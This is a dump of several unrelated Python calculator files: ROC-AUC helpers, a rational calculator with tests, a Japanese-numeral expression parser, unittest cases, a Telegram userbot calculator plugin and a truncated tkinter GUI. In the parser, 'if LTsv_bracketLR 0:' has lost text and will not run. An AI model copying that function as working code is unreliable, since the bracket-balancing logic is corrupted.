+= \"_WEIGHTS_SUBS\" + str(subset)\n    return d\n\n\n# The primary versions of three methods below were\n#  evaluate from tf_model.py\n#  evaluate2 from tf_model.py\n#  both using \n#  evaluate_preds  from tf_model.py\n# when extending to multi-class something is not correctly\n# implemented for handling numpy arrays. \n\n\ndef evaluate_roc_auc(preds, wa, wb):\n    n = len(preds)\n    true_labels = np.concatenate([np.ones(n), np.zeros(n)])\n    preds = np.concatenate([preds, preds])\n    weights = np.concatenate([wa, wb])\n    \n    return roc_auc_score(true_labels, preds, sample_weight=weights)\n\n\ndef calculate_roc_auc(preds_w, calc_w, index_a, index_b):\n    n, num_classes = calc_w.shape\n    true_labels = np.concatenate([np.ones(n), np.zeros(n)])\n    preds = np.concatenate([preds_w[:, index_a], preds_w[:, index_a]])\n    weights = np.concatenate([calc_w[:, index_a], calc_w[:, index_b]])\n\n    return roc_auc_score(true_labels, preds, sample_weight=weights)\n\n# binary classification\ndef test_roc_auc(directory, num_class):\n    calc_w = np.load(os.path.join(directory, 'softmax_calc_w.npy'))\n    preds_w = np.load(os.path.join(directory, 'softmax_preds_w.npy'))\n    \n    oracle_roc_auc = []\n    preds_roc_auc  = []\n    \n    for i in range(0, num_class):\n         oracle_roc_auc  += [calculate_roc_auc(calc_w, calc_w, 0, i)]\n         preds_roc_auc   += [calculate_roc_auc(preds_w, calc_w, 0, i)]\n         print(i,\n                  'oracle_roc_auc: {}'.format(calculate_roc_auc(calc_w, calc_w, 0, i)),\n                  'preds_roc_auc: {}'.format(calculate_roc_auc(preds_w, calc_w, 0, i)))\n\n    return oracle_roc_auc, preds_roc_auc\n", "337": "\"\"\"\n  Calculator module, contains functions related to the calculator\n\"\"\"\n\nfrom domain.rational import *\n\n\ncalc_total = [0, 1]\nundolist = []\n\ndef calc_get_total():\n    \"\"\"\n      Current total\n      return a list with 2 elements representing a rational number\n    \"\"\"\n    return calc_total\n\ndef undo():\n    \"\"\"\n      Undo the last user operation\n      post: restore the previous current total\n    \"\"\"\n    global undolist\n    global calc_total\n    calc_total = undolist[-1]\n    undolist = undolist[:-1]\n\ndef calc_add(a, b):\n    \"\"\"\n      add a rational number to the current total\n      a, b integer number, b<>0\n      post: add a/b to the current total\n    \"\"\"\n    global undolist\n    global calc_total\n    #add the current total to the undo list\n    undolist.append(calc_total)\n    calc_total = rational_add (calc_total[0], calc_total[1], a, b)\n\n\ndef reset_calc():\n    \"\"\"\n      Reset the calculator\n      post: the curent total equal 0/1\n    \"\"\"\n    global calc_total\n    calc_total = [0, 1]\n\n    global undolist\n    undolist = []\n\n\ndef test_rational_add():\n    \"\"\"\n      Test function for rational_add\n    \"\"\"\n    assert rational_add(1, 2, 1, 3) == [5, 6]\n    assert rational_add(1, 2, 1, 2) == [1, 1]\n\ndef test_calculator_add():\n    \"\"\"\n      Test function for calculator_add\n    \"\"\"\n    reset_calc()\n    assert calc_get_total() == [0, 1]\n    calc_add(1, 2)\n    assert calc_get_total() == [1, 2]\n    calc_add(1, 3)\n    assert calc_get_total() == [5, 6]\n    calc_add(1, 6)\n    assert calc_get_total() == [1, 1]\n\ndef test_undo():\n    \"\"\"\n      Test function for undo\n    \"\"\"\n    reset_calc()\n    calc_add(1, 3)\n    undo()\n    assert calc_get_total() == [0, 1]\n    reset_calc()\n    calc_add(1, 3)\n    calc_add(1, 3)\n    calc_add(1, 3)\n    undo()\n    assert calc_get_total() == [2, 3]\n\n\ntest_rational_add()\ntest_calculator_add()\ntest_undo()\n", "338": "#! /usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom __future__ import division,print_function,absolute_import,unicode_literals\nimport re\nimport math\n\ndef LTsv_calc_GCM(LTsv_calcL,LTsv_calcR):\n    LTsv_GCMm,LTsv_GCMn=abs(int(LTsv_calcL)),abs(int(LTsv_calcR))\n    if LTsv_GCMm < LTsv_GCMn:\n        LTsv_GCMm,LTsv_GCMn=LTsv_GCMn,LTsv_GCMm\n    while LTsv_GCMn > 0:\n        LTsv_GCMm,LTsv_GCMn=LTsv_GCMn,LTsv_GCMm%LTsv_GCMn\n    return LTsv_GCMm\ndef LTsv_calc_LCM(LTsv_calcL,LTsv_calcR):\n    return abs(int(LTsv_calcL))*abs(int(LTsv_calcR))//LTsv_calc_GCM(LTsv_calcL,LTsv_calcR)\n\nLTsv_character=\"\uff11\uff12\uff13\uff14\uff15\uff16\uff17\uff18\uff19\uff10\"\"\u4e00\u4e8c\u4e09\u56db\u4e94\u516d\u4e03\u516b\u4e5d\u3007\"\"\u58f1\u5f10\u53c2\u8086\u4f0d\u9678\u6f06\u634c\u7396\u96f6\"\"\u964c\u9621\u842c\u4ed9\" \\\n               \"\uff0e\uff5c\uff30\uff50P\uff2d\uff4dM\uff39\uff59Y\u03c0\uff45\uff25E\uff23\uff43C\uff2e\uff4eN\"\"\u5c0f\u5186\u5206\u6b63\u8ca0\u5468\u5e95\u6570\u7121\u221e\" \\\n               \"\uff0b\uff0d\uff05\u00d7\uff0f\uff3c\u00f7\uff03\"\"\u52a0\u6e1b\u4e57\u9664\u4f59\"\"\u8db3\u5f15\u639b\u5272\"\"\u548c\u5dee\u7a4d\u5546\" \\\n               \"\uff08\u03a3\uff33\uff53S\uff5e\uff01\uff2c\uff4cl\uff27\uff47g\uff09\"\"\u5217\u4f46\u203b\u301c\u65b9\u7d04\u500d\u300c\u300d\u300e\u300f\u62ec\u5f27{}\uff5b\uff5d[][]\"\nLTsv_operator= \"1234567890\"          \"1234567890\"          \"1234567890\"          \"\u767e\u5343\u4e07\u92ad\" \\\n               \".|pppmmmyyyyeeecccnnn\"               \"..|pmyecnn\" \\\n               \"+-%*/\\\\/#\"      \"+-*/#\"     \"+-*/\"    \"+-*/\" \\\n               \"(SSSS~!LLLGGG)\"         \"SSS~!LG()()()()()()()\"\nLTsv_opechardic=dict(zip(list(LTsv_character),list(LTsv_operator)))\n\nLTsv_okusenman=\"\u5793\u4eac\u5146\u5104\u4e07\u5343\u767e\u5341\u92ad\"\nLTsv_okusenzero=[\"*1\"+'0'*20+\"+\",\"*1\"+'0'*16+\"+\",\"*1\"+'0'*12+\"+\",\"*1\"+'0'*8+\"+\",\"*1\"+'0'*4+\"+\",\"1000+\",\"100+\",\"10+\",\"+1/100\"]\nLTsv_okusendic=dict(zip(list(LTsv_okusenman),LTsv_okusenzero))\n\nLTsv_calcusemark=LTsv_okusenman+\"1234567890.|pmyecn+-*/\\\\#%(S!LG~)\"\n\nLTsv_opemark=[\"*+\",\"*-\",\"/+\",\"/-\",\"#+\",\"#-\",\"|+\",\"|-\",\"++\",\"+-\",\"-+\",\"--\",\n              \"0c\", \"1c\", \"2c\", \"3c\", \"4c\", \"5c\", \"6c\", \"7c\", \"8c\", \"9c\", \".c\",\n              \"0(\", \"1(\", \"2(\", \"3(\", \"4(\", \"5(\", \"6(\", \"7(\", \"8(\", \"9(\", \".(\",\n              \")0\", \")1\", \")2\", \")3\", \")4\", \")5\", \")6\", \")7\", \")8\", \")9\", \").\",\n              \")(\", \"|(\"]\nLTsv_opechar=[\"*p\",\"*m\",\"/p\",\"/m\",\"#p\",\"#m\",\"|p\",\"|m\",\"+p\",\"+m\",\"-p\",\"-m\",\n              \"0*c\",\"1*c\",\"2*c\",\"3*c\",\"4*c\",\"5*c\",\"6*c\",\"7*c\",\"8*c\",\"9*c\",\".*c\",\n              \"0*(\",\"1*(\",\"2*(\",\"3*(\",\"4*(\",\"5*(\",\"6*(\",\"7*(\",\"8*(\",\"9*(\",\".*(\",\n              \")*0\",\")*1\",\")*2\",\")*3\",\")4*\",\")*5\",\")*6\",\")*7\",\")*8\",\")*9\",\")*.\",\n              \")*(\", \"/(\"]\nLTsv_opemarkdic=dict(zip(LTsv_opemark,LTsv_opechar))\n\ndef LTsv_calc_bracketsbalance(LTsv_calcQbase):\n    LTsv_calcQ=LTsv_calcQbase.replace('\\n','\\t').replace('\\t',''); LTsv_calcA=\"\"\n    LTsv_bracketLR=0; LTsv_bracketCAP=0\n    for LTsv_Q in LTsv_calcQ:\n        if LTsv_Q in LTsv_opechardic:\n            LTsv_Q=LTsv_opechardic[LTsv_Q]\n        if LTsv_Q in LTsv_calcusemark:\n            LTsv_calcA+=LTsv_Q\n        if LTsv_Q == '(':\n            LTsv_bracketLR+=1\n        if LTsv_Q == ')':\n            LTsv_bracketLR-=1\n            if LTsv_bracketLR 0:\n        LTsv_calcA=LTsv_calcA+')'*abs(LTsv_bracketLR)\n    if LTsv_bracketLR < 0:\n        LTsv_calcA='('*abs(LTsv_bracketLR)+LTsv_calcA\n    LTsv_calcA='('*abs(LTsv_bracketCAP)+LTsv_calcA+')'*abs(LTsv_bracketCAP)\n    LTsv_calcA=LTsv_calcA.replace('y','('+str(math.pi)+')').replace('e','('+str(math.e)+')').replace('n','(n|0)')\n    for LTsv_opecase in LTsv_opemarkdic:\n        if LTsv_opecase in LTsv_calcA:\n            LTsv_calcA=LTsv_calcA.replace(LTsv_opecase,LTsv_opemarkdic[LTsv_opecase])\n#    print(\"LTsv_calcA\",LTsv_calcA)\n    LTsv_calcA=re.sub(re.compile(\"([0-9\u5343\u767e\u5341]+?)\u92ad\"),\"+(\\\\1/100)\",LTsv_calcA)\n    LTsv_calcA=re.sub(re.compile(\"([0-9\u5343\u767e\u5341]+?)\u4e07\"),\"(\\\\1)*1\"+'0'*4+\"+\",LTsv_calcA)\n    LTsv_calcA=re.sub(re.compile(\"([0-9\u5343\u767e\u5341]+?)\u5104\"),\"(\\\\1)*1\"+'0'*8+\"+\",LTsv_calcA)\n    LTsv_calcA=re.sub(re.compile(\"([0-9\u5343\u767e\u5341]+?)\u5146\"),\"(\\\\1)*1\"+'0'*12+\"+\",LTsv_calcA)\n    LTsv_calcA=re.sub(re.compile(\"([0-9\u5343\u767e\u5341]+?)\u4eac\"),\"(\\\\1)*1\"+'0'*16+\"+\",LTsv_calcA)\n    LTsv_calcA=re.sub(re.compile(\"([0-9\u5343\u767e\u5341]+?)\u5793\"),\"(\\\\1)*1\"+'0'*20+\"+\",LTsv_calcA)\n    LTsv_calcA=re.sub(re.compile(\"([0-9]+?)\u5343\"),\"(\\\\1*1000)+\",LTsv_calcA)\n    LTsv_calcA=re.sub(re.compile(\"([0-9]+?)\u767e\"),\"(\\\\1*100)+\",LTsv_calcA)\n    LTsv_calcA=re.sub(re.compile(\"([0-9]+?)\u5341\"),\"(\\\\1*10)+\",LTsv_calcA)\n    for LTsv_okusen in LTsv_okusenman:\n        LTsv_calcA=LTsv_calcA.replace(LTsv_okusen,LTsv_okusendic[LTsv_okusen])\n#    print(\"LTsv_calcA\",LTsv_calcA)\n    return LTsv_calcA\n\ndef LTsv_calc_decimalize(LTsv_calcQbase):\n    LTsv_calcQ=LTsv_calcQbase.replace('\\n','\\t').replace('\\t','').replace('\\t',''); LTsv_calcA=\"n|0\"\n    if not '|' in LTsv_calcQ:\n        LTsv_calcQ+='|1'\n    LTsv_calcQ=LTsv_calcQ.replace('/','|')\n    LTsv_calcQsplits=LTsv_calcQ.split('|')\n    LTsv_calcQmulti=LTsv_calcQsplits.pop(0)\n    if 'n' in LTsv_calcQmulti:\n        LTsv_calcQsplits=[0.0]\n    else:\n        LTsv_decinum=float(LTsv_calcQmulti)\n    for LTsv_calcQmulti in LTsv_calcQsplits:\n        if float(LTsv_calcQmulti) == 0.0:\n            break\n        LTsv_decinum/=float(LTsv_calcQmulti)\n    else:\n        LTsv_calcA=str(LTsv_decinum)\n    return LTsv_calcA\n\ndef LTsv_calc_fractalize(LTsv_calcQbase):\n    LTsv_calcQ=LTsv_calcQbase.replace('\\n','\\t').replace('\\t','').replace('\\t',''); LTsv_calcA=\"n|0\"\n    if not '|' in LTsv_calcQ:\n        LTsv_calcQ+='|1'\n    LTsv_calcQ=LTsv_calcQ.replace('/','|')\n    LTsv_calcQsplits=LTsv_calcQ.split('|')\n    LTsv_calcQmulti=LTsv_calcQsplits.pop(0)\n    if 'n' in LTsv_calcQmulti:\n        LTsv_calcQsplits=[\"0.0\"]\n    else:\n        LTsv_calcQmulti=LTsv_calcQmulti.replace('+','').replace('-','') if not '-' in LTsv_calcQmulti else '-'+LTsv_calcQmulti.replace('+','').replace('-','')\n        LTsv_calcQmulti=LTsv_calcQmulti if '.' in LTsv_calcQmulti else LTsv_calcQmulti+'.'\n        LTsv_fractdeno=int('1'+'0'*(len(LTsv_calcQmulti)-1-LTsv_calcQmulti.find('.')))\n        LTsv_calcQmulti=LTsv_calcQmulti.replace('.','')\n        LTsv_fractnum=int(LTsv_calcQmulti) if len(LTsv_calcQmulti) > 0 and LTsv_calcQmulti != \"-\" else 0\n    for LTsv_calcQmulti in LTsv_calcQsplits:\n        LTsv_calcQmulti=LTsv_calcQmulti.replace('+','').replace('-','') if not '-' in LTsv_calcQmulti else '-'+LTsv_calcQmulti.replace('+','').replace('-','')\n        LTsv_calcQmulti=LTsv_calcQmulti if '.' in LTsv_calcQmulti else LTsv_calcQmulti+'.'\n        if LTsv_calcQmulti in [\".\",\"-.\"]:\n            LTsv_calcQmulti=\"0.0\"\n        if LTsv_calcQmulti.count('.') > 1:\n            LTsv_calcQmulti=\"0.0\"\n        if float(LTsv_calcQmulti) == 0.0:\n            break\n        LTsv_fractnum*=int('1'+'0'*(len(LTsv_calcQmulti)-1-LTsv_calcQmulti.find('.')))\n        LTsv_calcQmulti=LTsv_calcQmulti.replace('.','')\n        LTsv_fractdeno*=int(LTsv_calcQmulti) if len(LTsv_calcQmulti) > 0 else 0\n    else:\n        LTsv_GCM=LTsv_calc_GCM(LTsv_fractnum,LTsv_fractdeno)\n        LTsv_fractdeno=LTsv_fractdeno//LTsv_GCM\n        LTsv_fractnum=LTsv_fractnum//LTsv_GCM\n        LTsv_calcA=str(LTsv_fractnum)+\"|\"+str(LTsv_fractdeno)\n    return LTsv_calcA\n\ndef LTsv_calc(LTsv_calcQbase):\n    LTsv_calcQ=LTsv_calcQbase.replace('\\n','\\t').replace('\\t',''); LTsv_calcA=\"n|0\"\n    LTsv_calcQ=LTsv_calc_bracketsbalance(LTsv_calcQbase); LTsv_calcA=LTsv_calcQ\n    LTsv_bracketreg=re.compile(\"[(](?<=[(])[^()]*(?=[)])[)]\")\n    while \"(\" in LTsv_calcA:\n        for LTsv_func in re.findall(LTsv_bracketreg,LTsv_calcA):\n            LTsv_calcA=LTsv_calcA.replace(LTsv_func,LTsv_calc_function(LTsv_func))\n    LTsv_calcA=LTsv_calcA.replace(LTsv_calcA,LTsv_calc_function(LTsv_calcA))\n    LTsv_calcA=LTsv_calc_fractalize(LTsv_calcA)\n    if LTsv_calcA==LTsv_calcQ:\n        LTsv_calcA=LTsv_calc_decimalize(LTsv_calcA)\n    return LTsv_calcA\n\ndef LTsv_calc_function(LTsv_calcQbase):\n    LTsv_calcQ=LTsv_calcQbase.replace('\\n','\\t').replace('\\t','').replace('\\t',''); LTsv_calcA=\"\"\n    LTsv_calcQ=LTsv_calcQ.lstrip(\"(\").rstrip(\")\")\n#    print(\"LTsv_calcQ\",LTsv_calcQ)\n    for LTsv_opecase in LTsv_opemarkdic:\n        if LTsv_opecase in LTsv_calcQ:\n            LTsv_calcQ=LTsv_calcQ.replace(LTsv_opecase,LTsv_opemarkdic[LTsv_opecase])\n#    print(\"LTsv_calcQ\",LTsv_calcQ)\n    if not 'S' in LTsv_calcQ and not '!' in LTsv_calcQ:\n        LTsv_calcQ+=\"S1\"\n    LTsv_Count=\"1|1\"; LTsv_fractC='S'; LTsv_fractC_BF=LTsv_fractC; LTsv_limmark='+'\n    LTsv_limstart,LTsv_limgoal,LTsv_limstep=1,2,+1\n    LTsv_calcQ=LTsv_calcQ.replace('S',\"\\tS\").replace('!',\"\\t!\").replace('~',\"\\t~\")\n    LTsv_calcQsplits=LTsv_calcQ.strip('\\t').split('\\t')\n    LTsv_calcAfirst=LTsv_calcQsplits.pop(0)\n    for LTsv_calcQadd in LTsv_calcQsplits:\n        LTsv_fractC_BF=LTsv_fractC; LTsv_fractC=LTsv_calcQadd[0]\n        LTsv_Count_BF=LTsv_Count; LTsv_Count=LTsv_calc_addition(LTsv_calcQadd.lstrip('S~!'),LTsv_Count)\n        if 'n' in LTsv_Count:\n            break\n        if LTsv_fractC == 'S':\n            LTsv_limmark='+'\n            LTsv_limstart=int(float(LTsv_calc_decimalize(LTsv_Count)))\n            LTsv_limgoal=int(float(LTsv_calc_decimalize(LTsv_Count)))+1\n        elif LTsv_fractC == '!':\n            LTsv_limmark='*'\n            LTsv_limstart=int(float(LTsv_calc_decimalize(LTsv_Count)))\n            LTsv_limgoal=int(float(LTsv_calc_decimalize(LTsv_Count)))+1\n        else:\n            LTsv_limstart=int(float(LTsv_calc_decimalize(LTsv_Count_BF)))\n            LTsv_limgoal=int(float(LTsv_calc_decimalize(LTsv_Count)))\n            if LTsv_limstart < LTsv_limgoal:\n                LTsv_limstart+=1; LTsv_limgoal+=1\n            if LTsv_limgoal < LTsv_limstart:\n                LTsv_limstart-=1; LTsv_limgoal-=1\n        LTsv_limstep=1 if LTsv_limstart < LTsv_limgoal else -1\n        for LTsv_lim in range(LTsv_limstart,LTsv_limgoal,LTsv_limstep):\n            LTsv_calcA=LTsv_calcA+LTsv_limmark+LTsv_calc_addition(LTsv_calcAfirst,str(LTsv_lim))\n#    print(\"LTsv_calcA\",LTsv_calcA)\n    LTsv_calcA=LTsv_calc_addition(LTsv_calcA,LTsv_Count)\n    return LTsv_calcA\n\ndef LTsv_calc_addition(LTsv_calcQbase,LTsv_Count):\n    LTsv_calcQ=LTsv_calcQbase.replace('\\n','\\t').replace('\\t','').replace('\\t',''); LTsv_calcA=\"n|0\"\n    LTsv_calcQ=LTsv_calcQ.replace('c',LTsv_Count)\n    LTsv_calcQ=LTsv_calcQ.replace(\"++\",\"+\").replace(\"+-\",\"-\").replace(\"--\",\"+\").replace(\"-+\",\"-\")\n    LTsv_calcQ=LTsv_calcQ.replace('+','\\t+').replace('-','\\t-')\n    LTsv_fractnum,LTsv_fractdeno=0,1\n    LTsv_calcQsplits=LTsv_calcQ.strip('\\t').split('\\t')\n    for LTsv_calcQmulti in LTsv_calcQsplits:\n        LTsv_fractC='' if not '%' in LTsv_calcQmulti else '%'\n        LTsv_calcR=LTsv_calc_multiplication(LTsv_calcQmulti.replace('%',''))\n        LTsv_fractR=LTsv_calcR.split('|')\n        if float(LTsv_fractR[1]) == 0.0:\n            break\n        if LTsv_fractC == '%':\n            LTsv_fractnum=LTsv_fractnum*int(LTsv_fractR[1])*100+LTsv_fractnum*int(LTsv_fractR[0])\n            LTsv_fractdeno*=int(LTsv_fractR[1])*100\n        else:\n            LTsv_fractnum=LTsv_fractnum*int(LTsv_fractR[1])+LTsv_fractdeno*int(LTsv_fractR[0])\n            LTsv_fractdeno*=int(LTsv_fractR[1])\n    else:\n        if LTsv_fractdeno < 0:\n            LTsv_fractnum,LTsv_fractdeno=-LTsv_fractnum,-LTsv_fractdeno\n        LTsv_calcA=str(LTsv_fractnum)+'|'+str(LTsv_fractdeno)\n    return LTsv_calcA\n\ndef LTsv_calc_multiplication(LTsv_calcQbase):\n    LTsv_calcQ=LTsv_calcQbase.replace('\\n','\\t').replace('\\t','').replace('\\t',''); LTsv_calcA=\"n|0\"\n    LTsv_calcQ=LTsv_calcQ.replace('*',\"\\t*\").replace('/',\"\\t/\").replace('\\\\',\"\\t\\\\\").replace('#',\"\\t#\").replace('L',\"\\tL\").replace('G',\"\\tG\")\n    LTsv_calcQ=LTsv_calcQ.replace(\"+p\",\"+\").replace(\"+m\",\"-\").replace(\"-m\",\"+\").replace(\"-p\",\"-\")\n    LTsv_calcQ=LTsv_calcQ.replace(\"p\",\"+\").replace(\"m\",\"-\")\n    LTsv_fractnum,LTsv_fractdeno=1,1; LTsv_fractC='*'\n    LTsv_calcQsplits=LTsv_calcQ.strip('\\t').split('\\t')\n    for LTsv_calcQfraction in LTsv_calcQsplits:\n        LTsv_fractC=LTsv_calcQfraction[0] if len(LTsv_calcQfraction)>0 else '*'\n        LTsv_calcR=LTsv_calc_fractalize(LTsv_calcQfraction.lstrip('*/\\\\#LG'))\n        LTsv_fractR=LTsv_calcR.split('|')\n        if LTsv_fractC == '/':\n            if int(LTsv_fractR[0]) == 0:\n                break\n            LTsv_fractnum*=int(LTsv_fractR[1])\n            LTsv_fractdeno*=int(LTsv_fractR[0])\n        elif LTsv_fractC == '\\\\':\n            if int(LTsv_fractR[0]) == 0:\n                break\n            LTsv_fractnum*=int(LTsv_fractR[1])\n            LTsv_fractdeno*=int(LTsv_fractR[0])\n            LTsv_fractnum,LTsv_fractdeno=LTsv_fractnum//LTsv_fractdeno,1\n        elif LTsv_fractC == '#':\n            if int(LTsv_fractR[0]) == 0 or int(LTsv_fractR[1]) == 0:\n                break\n            LTsv_fractnum=(LTsv_fractnum*int(LTsv_fractR[1]))%(LTsv_fractdeno*int(LTsv_fractR[0]))\n            LTsv_fractdeno*=int(LTsv_fractR[1])\n        elif LTsv_fractC == 'L':\n            if LTsv_fractdeno == int(LTsv_fractR[1]):\n                LTsv_fractnum=LTsv_calc_LCM(LTsv_fractnum,int(LTsv_fractR[0]))\n                LTsv_fractdeno=1\n            else:\n                break\n        elif LTsv_fractC == 'G':\n            if LTsv_fractdeno == int(LTsv_fractR[1]):\n                LTsv_fractnum=LTsv_calc_GCM(LTsv_fractnum,int(LTsv_fractR[0]))\n                LTsv_fractdeno=1\n            else:\n                break\n        else:\n            if int(LTsv_fractR[1]) == 0:\n                break\n            LTsv_fractnum*=int(LTsv_fractR[0])\n            LTsv_fractdeno*=int(LTsv_fractR[1])\n    else:\n        LTsv_calcA=LTsv_calc_fractalize(str(LTsv_fractnum)+'|'+str(LTsv_fractdeno))\n    return LTsv_calcA\n\n\nif __name__==\"__main__\":\n    from LTsv_printf import *\n    from LTsv_file   import *\n    print(\"__main__ Python{0.major}.{0.minor}.{0.micro},{1},{2}\".format(sys.version_info,sys.platform,sys.stdout.encoding))\n    print(\"\")\n    LTsv_calcQlist=[ \"1/3\",\"1|3*3\",\"1-m2\",\n                     \"1|6+1|3\",\"3|4-1|4\",\"2|3*3|4\",\"2|5/4|5\",\"7\\\\3\",\"10#3\",\"3|2#1|3\",\"10000+8%\",\"24G36\",\"24L36\",\"24|7G36|7\",\"24|7G36|11\",\n                     \"0.5|3.5\",\"0.5/3.5\",\"1|2/7|2\",\"2|3|5|7\",\"2||3\",\"2|--|3\",\"2|p-|3\",\"2|..|3\",\"2|p4.|3\",\"2|m.4|3\",\n                     \"(c+2)(c+1)\",\"(c+2)*(c+1)\",\"1|-3\",\"1|(2-5)\",\"(4-3)|-3\",\"(4-3)|(2-5)\",\"(3+5)|(2-5)\",\n                     \"c\u03a31\u03a32\u03a33\u03a34\",\"c\u03a31~4\",\"cS1~4\",\"c|2S1~4\",\"c!1!2!3!4\",\"c!1~4\",\"c!4\uff5e1\",\"2!1\uff5e16\",\"2!\uff5e15\",\"2!0\uff5e15\",\n                     \"c\",\"1|1\",\"\u03c0\",\"314159265359|100000000000\",\"3.1416\",\"\uff45\",\"135914091423|50000000000\",\"2.71828\",\"n\",\"n|0\",\"123456789/0\",\n                     \"8765\u57934321\u4eac0987\u51468901\u5104987\u4e076543\u5186210\u92ad\",\"\u4e00\u5343\u4e8c\u767e\u4e09\u5341\u56db\u4e07\u4e94\u5343\u516d\u767e\u4e03\u5341\u516b\",\"\u5343\u767e\u5341\",\"\u5104\u5343\u4e07\",\"\u58f1\u842c\u5186\" ]\n    for LTsv_calcQ in LTsv_calcQlist:\n        LTsv_libc_printf(\"{0}\u21d4{1}\".format(LTsv_calcQ,LTsv_calc(LTsv_calcQ)))\n    print(\"\")\n    print(\"__main__\",LTsv_file_ver())\n\n\n# Copyright (c) 2016 ooblog\n# License: MIT\n# https://github.com/ooblog/LTsv9kantray/blob/master/LICENSE\n", "339": "import unittest\nfrom unittest import result\nimport calc\n\nclass TestCalc(unittest.TestCase):\n\n    def test_add(self):\n        self.assertEqual(calc.add(10, 5), 15)\n        self.assertEqual(calc.add(10, -5), 5)\n        self.assertEqual(calc.add(-5, -5), -10)\n\n    def test_substruct(self):\n        self.assertEqual(calc.substruct(10, 5), 5)\n        self.assertEqual(calc.substruct(10, -5), 15)\n        self.assertEqual(calc.substruct(-5, -5), 0)\n\n    def test_multiply(self):\n        self.assertEqual(calc.multiply(10, 5), 50)\n        self.assertEqual(calc.multiply(10, -5), -50)\n        self.assertEqual(calc.multiply(-5, -5), 25)\n        self.assertEqual(calc.multiply(10, 0), 0)\n\n    def test_divison(self):\n        self.assertEqual(calc.divison(10, 5), 2)\n        self.assertEqual(calc.divison(1, -1), -1)\n        self.assertEqual(calc.divison(-1, -1), 1)\n        self.assertEqual(calc.divison(5, 2), 2.5)\n\n        with self.assertRaises(ValueError):\n            calc.divison(10, 0)\n\n    def test_modulo(self):\n        self.assertEqual(calc.modulo(11, 5), 1)\n        self.assertEqual(calc.modulo(10, 5), 0)\n        self.assertEqual(calc.modulo(-11, 5), 4)\n        self.assertEqual(calc.modulo(11, -5), -4)\n\n    def test_power(self):\n        self.assertEqual(calc.power(2, 2), 4)\n        self.assertEqual(calc.power(10, 0), 1)\n        self.assertEqual(calc.power(4, 0.5), 2)\n        self.assertEqual(calc.power(4, -2), 0.0625)\n\nif __name__ == '__main__':\n    unittest.main()", "340": "# Ultroid - UserBot\n# Copyright (C) 2020 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\n\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await ultroid_bot.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n\n\nHELP.update({f\"{__name__.split('.')[1]}\": f\"{__doc__.format(i=HNDLR)}\"})\n", "341": "import tkinter\nfrom tkinter import ttk\nimport tkinter.font as tkfont\nfrom functools import partial\nimport lib\n\ninit = False\n\ncolors = {'dark' : ['#404040','#363636','white'],\n          'light': ['#f0f0f0','#d8d8d8','black']}\n\ndef Actualiser(txt):\n    try:\n        if lib.textCalc == '0' and str(txt) in '0123456789':\n            lib.textCalc = str(txt)\n            calcTxt.config(text=lib.textCalc)\n            return\n        if txt == 'SUPPR' :\n            if lib.textCalc == 'Error' :\n                lib.textCalc = ''\n                calcTxt.config(text=lib.textCalc)\n                return\n            if lib.textCalc == \"Error, result too long\" :\n                lib.textCalc = ''\n                